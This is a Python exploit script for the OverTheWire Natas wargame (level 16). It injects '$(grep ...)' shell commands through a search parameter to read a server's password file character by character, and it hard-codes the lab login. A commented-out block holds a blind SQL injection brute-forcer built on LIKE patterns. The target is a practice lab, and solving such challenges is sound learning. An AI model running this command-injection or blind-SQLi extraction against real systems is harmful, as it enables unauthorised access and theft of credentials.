import requests
from multiprocessing.pool import ThreadPool
import string

#WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

def main():
  username = 'natas16'
  password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
  authorization = (username, password)
  url = "http://natas16.natas.labs.overthewire.org"

  dummy = "Africans"
  pwrd = ""
  
  def query(symbol):
    nonlocal pwrd
    needle = f"{dummy}$(grep ^{pwrd}{symbol} /etc/natas_webpass/natas17)"
    feedback = requests.get(f"{url}/?needle={needle}", auth=authorization)
    if dummy not in feedback.text: return symbol
    return None

  
  symbols = string.ascii_letters + string.digits
  length = 32 
  for _ in range(length):
    print(pwrd, "J")
    print("b")
    with ThreadPool(len(symbols)) as pool:
      for result in pool.imap_unordered(query, symbols):
        if result is not None:
          pwrd += result
          break
    
  print(pwrd, "K")
  

if __name__ == "__main__":
  main()

# def user_with_query(query):
  #   check, url = query
  #   if "user exists" in authorized_get(url).text[150:]:
  #     return check
  #   return None


  # len_queries = [(i, f"{url}\" AND password LIKE \"{'_'*i}") for i in range(1,65)]

  # # for url in sites:
  # # print(sitesize(url))
  # length = 0
  # with ThreadPool(len(len_queries)) as pool:
  #   for result in pool.imap_unordered(user_with_query, len_queries):
  #     if result is not None:
  #       length = result
  #       break
  
  # flag_chars = [""]*length
  # possible = string.ascii_letters + string.digits
  # for i in range(length):
  #   char_queries = [(poss, f"{url}\" AND password LIKE BINARY \"{'_'*i + poss + '_'*(length-i-1)}") for poss in possible]
  #   with ThreadPool(len(possible)) as pool:
  #     for result in pool.imap_unordered(user_with_query, char_queries):
  #       if result is not None:
  #         flag_chars[i] = result
  #         break
  # print("".join(flag_chars))